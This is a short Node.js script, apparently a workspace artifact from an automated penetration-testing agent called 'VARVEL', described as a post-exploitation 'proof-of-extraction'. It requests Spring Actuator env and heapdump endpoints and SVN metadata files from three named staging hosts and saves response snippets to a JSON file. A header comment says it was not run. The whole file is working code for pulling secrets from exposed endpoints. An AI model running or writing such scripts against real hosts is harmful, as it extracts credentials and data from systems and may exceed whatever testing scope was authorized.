#!/usr/bin/env node
// scratch-postex-probe.mjs — workspace artifact for localizejs post-ex phase
// Purpose: if executed, performs a minimal-impact proof-of-extraction against
// confirmed Spring Actuator + SVN + backup findings. (Container down; not run.)

import { writeFileSync } from 'node:fs';

const TARGETS = [
  'http://api.localizestaging.com',
  'http://app.localizestaging.com',
  'http://localizestaging.com',
];

const PROBES = [
  { path: '/actuator/env',      title: 'Spring Actuator env' },
  { path: '/actuator/heapdump', title: 'Spring Actuator heapdump' },
  { path: '/.svn/entries',      title: 'SVN metadata' },
  { path: '/.svn/wc.db',        title: 'SVN wc.db' },
];

async function probe(url, path) {
  try {
    const r = await fetch(url + path, { method: 'GET', headers: { 'User-Agent': 'VARVEL-postex/0.1' } });
    const body = await r.text();
    return { status: r.status, size: body.length, snippet: body.slice(0, 200) };
  } catch (e) {
    return { error: e.message };
  }
}

async function main() {
  const results = [];
  for (const t of TARGETS) {
    for (const p of PROBES) {
      const res = await probe(t, p.path);
      results.push({ target: t, probe: p.path, ...res });
    }
  }
  const out = 'scratch-postex-results.json';
  writeFileSync(out, JSON.stringify(results, null, 2));
  console.log('Results written to', out);
}

main();
